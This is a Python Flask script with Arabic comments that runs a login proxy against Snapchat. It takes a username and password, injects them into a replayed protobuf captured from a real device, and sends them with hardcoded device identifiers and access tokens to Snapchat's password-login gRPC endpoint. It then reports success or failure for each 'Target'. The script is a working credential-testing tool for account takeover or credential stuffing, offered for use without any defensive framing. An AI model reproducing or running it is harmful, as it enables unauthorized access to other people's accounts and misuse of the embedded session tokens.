#!/usr/bin/env python3
from flask import Flask, request, Response
import requests
import base64
import struct
from google.protobuf import descriptor_pool
import blackboxprotobuf

app = Flask(__name__)

# ============================================================
# الـ Protobuf الحقيقي من جهازك النظيف (أنت اللي التقطته)
# ============================================================
YOUR_PROTOBUF_B64 = "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"

# التوكنات والهيدرات حقتك
HEADERS = {
    "X-Snapchat-UUID": "0196B3EE-508D-4FAC-9F7B-1B790E57DDBB",
    "X-Snap-UserID": "55a118bf-16cd-4527-9ea7-9f90fdab8faf",
    "X-Snap-Access-Token": "hCgwKCjE3Nzk2NzA4MjASgAHPo67ALSrMM9NeAahNE3jdlHSkQ-UzFQdCMXtlsYfixAZXA7omp_H7jlk",
    "x-snapchat-att-token": "Ci1iNFCsaIvuN4FmwoMSXqFN1o531mchZS20Zbt9Sv2TDy8ACaUEsYDd88NjSwoVAQAAAA==",
    "User-Agent": "Snapchat/12.80.0.35 (iPhone15,2; iOS 17.4.1; gzip)",
    "Content-Type": "application/grpc+proto",
    "te": "trailers"
}

SNAPCHAT_API = "https://us-east1-aws.api.snapchat.com/snapchat.janus.api.LoginService/LoginWithPassword"

@app.route('/proxy_login', methods=['POST'])
def proxy_login():
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    print(f"\n[+] Target: {username}")
    
    try:
        # 1. فك الـ Protobuf
        proto_bytes = base64.b64decode(YOUR_PROTOBUF_B64)
        decoded, typedef = blackboxprotobuf.decode_message(proto_bytes)
        
        # 2. تعديل username و password
        decoded['1'] = username.encode('utf-8')
        decoded['4'] = password.encode('utf-8')
        typedef['4']['type'] = 'bytes'
        
        # 3. إعادة تشفير
        re_encoded_bytes = blackboxprotobuf.encode_message(decoded, typedef)
        length_prefix = struct.pack('>I', len(re_encoded_bytes))
        grpc_body = b'\x00' + length_prefix + re_encoded_bytes
        
        # 4. إرسال
        response = requests.post(SNAPCHAT_API, headers=HEADERS, data=grpc_body, timeout=30)
        
        print(f"[*] HTTP {response.status_code}, grpc-status: {response.headers.get('grpc-status')}")
        
        if response.status_code == 200 and response.headers.get('grpc-status') == '0':
            print(f"[✓] SUCCESS!")
            return Response('{"status":"success"}', status=200)
        else:
            print(f"[!] Failed: {response.headers.get('grpc-message')}")
            return Response('{"status":"failed"}', status=200)
            
    except Exception as e:
        print(f"[X] Error: {e}")
        return Response(f'{{"status":"error", "message": "{str(e)}"}}', status=500)

@app.route('/health', methods=['GET'])
def health():
    return Response('{"status":"running"}', status=200)

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║     SnapChat Proxy - YOUR CAPTURED PROTOBUF                 ║
    ║                                                              ║
    ║  ✅ Using YOUR protobuf from clean device                   ║
    ║  ✅ Using YOUR tokens and headers                           ║
    ║                                                              ║
    ║  Server running on http://0.0.0.0:10000                    ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=10000, debug=False)
